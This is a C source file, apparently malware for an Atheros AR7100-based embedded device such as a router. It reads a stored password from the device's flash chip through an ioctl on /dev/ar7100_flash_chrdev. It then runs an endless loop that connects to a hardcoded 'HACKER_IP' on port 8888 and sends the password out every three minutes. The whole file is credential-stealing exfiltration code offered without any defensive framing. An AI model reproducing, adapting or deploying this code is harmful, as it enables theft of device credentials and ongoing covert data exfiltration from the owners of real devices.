#include <arpa/inet.h> // inet_addr()
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h> // bzero()
#include <sys/socket.h>
#include <unistd.h> // read(), write(), close()
//ioctl for atheos
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>

#define PORT 8888
#define SA struct sockaddr
#define HACKER_IP "192.168.0.101" 

//const values for atheos
#define DEVICE_FILE_NAME "/dev/ar7100_flash_chrdev"
#define IOCTL_SEND_MSG _IOR(MAJOR_NUM, 0, char *)
#define ATH_IO_MAGIC 0xB3
#define ATH_FLASH_READ				0x01
#define	ATH_IO_FLASH_READ _IOR(ATH_IO_MAGIC, ATH_FLASH_READ, char)

typedef struct 
{
	u_int32_t addr;		/* flash r/w addr	*/
	u_int32_t len;		/* r/w length		*/
	u_int8_t* buf;		/* user-space buffer*/
	u_int32_t buflen;	/* buffer length	*/
	u_int32_t reset;	/* reset flag 		*/
}ARG;

char message[65];

int ath_password_read(){
    int fd;
    int ret_val;
    int i = 0;
    
    ARG arg;
    ARG *parg = &arg;
    
    arg.addr = 0x7e5b20;
    //arg.addr = 0x3e5b20;
    
    arg.len = 64;
    arg.buf = message;
    arg.buflen =64;
    arg.reset = 0;
    
    fd = open(DEVICE_FILE_NAME, 0);
    
    ret_val = ioctl(fd, ATH_IO_FLASH_READ, (unsigned long)parg);
    message[64] = 0;
    
    if (ret_val < 0) {
	return -1;
    }
    
    return 0;
}


int main()
{
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;
	
	while(1){
		// socket create and verification
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		if (sockfd == -1) {
			printf("socket creation failed...\n");
			sleep(60);
			continue;
		}
		else
			printf("Socket successfully created..\n");
		bzero(&servaddr, sizeof(servaddr));

		// assign IP, PORT
		servaddr.sin_family = AF_INET;
		servaddr.sin_addr.s_addr = inet_addr(HACKER_IP);
		servaddr.sin_port = htons(PORT);
	
	
		// connect the client socket to server socket
		if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr))!= 0) {
			printf("connection with the server failed...\n");
			sleep(60);
			continue;
		}
		else
			printf("connected to the server..\n");

		// send password
		ath_password_read();
		write(sockfd, message, sizeof(message));
	
		// close the socket
		close(sockfd);
		
		sleep(180);
	}
}